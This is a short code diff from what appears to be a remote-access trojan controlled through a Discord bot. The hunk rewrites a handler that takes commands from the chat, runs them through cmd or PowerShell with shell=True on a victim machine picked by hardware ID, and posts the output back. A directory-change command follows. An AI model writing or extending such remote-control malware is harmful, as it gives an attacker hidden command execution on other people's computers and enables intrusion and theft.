@@ -393,21 +393,11 @@ URL="""+ url +"""
 		if not CheckHWID(HWID):
 			return
 
-		async def shell():
-			if shell_type == 'cmd':
-				output = str(subprocess.check_output(f'{command}', shell=True), 'utf-8')
-				await SendOutput(ctx, output)
-			elif shell_type == 'pwsh':
-				output = str(subprocess.check_output(f'powershell -Command "{command}"', shell=True), 'utf-8')
-				await SendOutput(ctx, output)
-
-		def between_shell():
-			loop = asyncio.new_event_loop()
-			asyncio.set_event_loop(loop)
-
-			loop.run_until_complete(shell())
-			loop.close()
-		threading.Thread(target = between_shell).start()
+		if shell_type == 'cmd':
+			output = str(subprocess.check_output(f'{command}', shell=True), 'utf-8')
+		elif shell_type == 'pwsh':
+			output = str(subprocess.check_output(f'powershell -Command "{command}"', shell=True), 'utf-8')
+		await SendOutput(ctx, output)
 
 	@commands.command(aliases=["cd"], brief='Change Directory', description='Change Directory')
 	async def Cd(self, ctx, HWID: str, *, path: str):
